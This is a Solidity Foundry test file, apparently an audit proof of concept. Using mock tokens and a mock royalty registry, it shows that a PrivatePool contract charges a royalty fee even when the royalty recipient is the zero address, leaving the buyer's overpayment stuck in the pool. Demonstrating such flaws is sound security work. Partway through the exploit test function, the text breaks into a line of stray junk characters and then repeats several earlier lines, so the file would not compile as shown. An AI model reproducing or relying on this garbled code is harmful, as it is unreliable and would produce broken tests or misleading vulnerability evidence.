// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

// Forge std
import "forge-std/Test.sol";

// Target contracts
import {PrivatePool} from "src/PrivatePool.sol";

// External interfaces used by PrivatePool
import {IRoyaltyRegistry} from "royalty-registry-solidity/IRoyaltyRegistry.sol";
import {IERC2981} from "openzeppelin/interfaces/IERC2981.sol";
import {IERC165} from "openzeppelin-contracts/contracts/utils/introspection/IERC165.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";

/* -------------------------------------------------------------------------- */
/*                                  Mocks                                     */
/* -------------------------------------------------------------------------- */

// Minimal, mintable ERC20 token
contract MockERC20 is ERC20("Mock Token", "MOCK", 18) {
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Minimal royalty registry that just returns a stored lookup address per NFT
contract MockRoyaltyRegistry is IRoyaltyRegistry {
    mapping(address => address) internal _lookup;

    /* --------- Mutative helper --------- */
    function setRoyaltyLookupAddressLocal(address token, address lookup) external {
        _lookup[token] = lookup;
    }

    /* --------- IRoyaltyRegistry --------- */

    function setRoyaltyLookupAddress(address tokenAddress, address royaltyAddress) external override returns (bool) {
        _lookup[tokenAddress] = royaltyAddress;
        emit RoyaltyOverride(msg.sender, tokenAddress, royaltyAddress);
        return true;
    }

    function getRoyaltyLookupAddress(address token) external view override returns (address) {
        address addr = _lookup[token];
        return addr == address(0) ? token : addr;
    }

    function getOverrideLookupTokenAddress(address) external pure override returns (address) {
        return address(0);
    }

    function overrideAllowed(address) external pure override returns (bool) {
        return true;
    }

    function supportsInterface(bytes4 interfaceId) external pure override returns (bool) {
        return interfaceId == type(IRoyaltyRegistry).interfaceId || interfaceId == 0x01ffc9a7; // IERC165
    }
}

// Simple ERC721 that implements ERC2981 and always returns a royalty with
// recipient = address(0) (triggering the vulnerability) and fee = 10%.
contract MockERC721Royalty is ERC721("Mock NFT", "MNFT"), IERC2981 {
    constructor() {
        // minting will be done manually in tests via _mint
    }

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    /* --------- IERC2981 --------- */

    function royaltyInfo(uint256 /*tokenId*/, uint256 salePrice)
        external
        pure
        override
        returns (address receiver, uint256 royaltyAmount)
    {
        // Return a royalty recipient of the zero address to simulate mis-configured royalties.
        // Royalty is fixed to 10% of the sale price.
        return (address(0), salePrice / 10);
    }

    // Implement the abstract tokenURI function from Solmate ERC721
    function tokenURI(uint256) public pure override returns (string memory) {
        return ""; // No metadata needed for the test
    }

    // ERC165 support: compose interfaces from both ERC721 and IERC2981
    function supportsInterface(bytes4 interfaceId)
        public
        view
        override(ERC721, IERC165)
        returns (bool)
    {
        return interfaceId == 0x2a55205a || super.supportsInterface(interfaceId);
    }
}

// Minimal factory that satisfies the implicit interface expected by PrivatePool
contract MockFactory {
    function protocolFeeRate() external pure returns (uint16) {
        return 0; // no protocol fee for simplicity
    }
}

/* -------------------------------------------------------------------------- */
/*                               Exploit Test                                 */
/* -------------------------------------------------------------------------- */

contract ExploitTest is Test {
    MockERC20 internal baseToken;
    MockERC721Royalty internal nft;
    MockRoyaltyRegistry internal royaltyRegistry;
    MockFactory internal factory;
    PrivatePool internal pool;

    address internal buyer = vm.addr(1); // attacker / trader
    // We keep using ERC20 as base token for clarity


    function setUp() public {
        // Deploy mocks
        baseToken = new MockERC20();
        nft = new MockERC721Royalty();
        royaltyRegistry = new MockRoyaltyRegistry();
        factory = new MockFactory();

        // Tell the registry to use the NFT contract itself for royalty lookups
        royaltyRegistry.setRoyaltyLookupAddress(address(nft), address(nft));

        // Deploy PrivatePool implementation directly (no proxy for simplicity)
        pool = new PrivatePool(
            payable(address(factory)), // factory address
            address(royaltyRegistry),  // royalty registry
            address(0)                 // stolenNftOracle (unused)
        );

        // Initialize pool with trivial parameters:
        pool.initialize(
            address(baseToken),        // base token (ERC20)
            address(nft),              // NFT collection
            100 ether,                 // virtual base token reserves
            10e18,                     // virtual NFT reserves (10 NFTs)
            0,                         // changeFee
            0,                         // feeRate (bps)
            bytes32(0),               // merkleRoot (no weighting proof needed)
            false,                    // useStolenNftOracle
            true                      // payRoyalties (important!)
        );

        // Mint an NFT to the pool so it can be purchased
        nft.mint(address(pool), 1);

        // Fund buyer with ample base tokens and approve pool
        baseToken.mint(buyer, 1_000 ether);
        vm.prank(buyer);
        baseToken.approve(address(pool), type(uint256).max);
    }

    /* ---------------------------------------------------------------------- */
    /*                     PoC - Excess royalty fee is taken                  */
    /* ---------------------------------------------------------------------- */

    function testExploit_RoyaltyFeeWithZeroRecipient() public {
        // Compute quote for buying 1 NFT (weight = 1e18 because merkleRoot = 0)
        (uint256 quotedNet,,) = pool.buyQuote(1e18);

        // Confirm there are no protocol or trade fees (only royalty will be added later)
        uint256 buyerBalBefore = baseToken.balanceOf(buyer);
        uint256 poolBalBefore  = baseToken.balanceOf(address(pool));

        // Prepare calldata arguments
        uint256[] memory tokenIds = new uint256[](1);
        uint256[] memory weights  = new uint256[](1);"} के}】حن 么??"}
        uint256 poolBalBefore  = baseToken.balanceOf(address(pool));

        // Prepare calldata arguments
        uint256[] memory tokenIds = new uint256[](1);
        uint256[] memory weights  = new uint256[](1);
        tokenIds[0] = 1;
        weights[0]  = 1e18; // weight ignored when merkleRoot == 0 but still required
        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);

        // Execute the buy from buyer address
        vm.prank(buyer);
        (uint256 netInput,,) = pool.buy(tokenIds, weights, proof);

        // Royalty expected = salePrice / 10 = quotedNet / 10 = 10 ether
        uint256 expectedRoyalty = quotedNet / 10;

        // The netInput returned by buy SHOULD include the royalty amount per buggy implementation
        assertEq(netInput, quotedNet + expectedRoyalty, "Royalty not added to net input as expected");

        // Buyer must have spent the larger netInput amount
        uint256 buyerSpent = buyerBalBefore - baseToken.balanceOf(buyer);
        assertEq(buyerSpent, netInput, "Buyer spent unexpected amount");

        // Pool received the entire amount even though royalty recipient is the zero address
        uint256 poolGain = baseToken.balanceOf(address(pool)) - poolBalBefore;
        assertEq(poolGain, netInput, "Pool balance did not increase by net input amount");

        // Confirm exploit impact: the buyer overpaid by the royalty amount which got stuck in the pool
        assertEq(buyerSpent - quotedNet, expectedRoyalty, "Overpayment mismatch - exploit failed");

        // * Vulnerability proven - royalty fee collected despite recipient being address(0)
    }
}
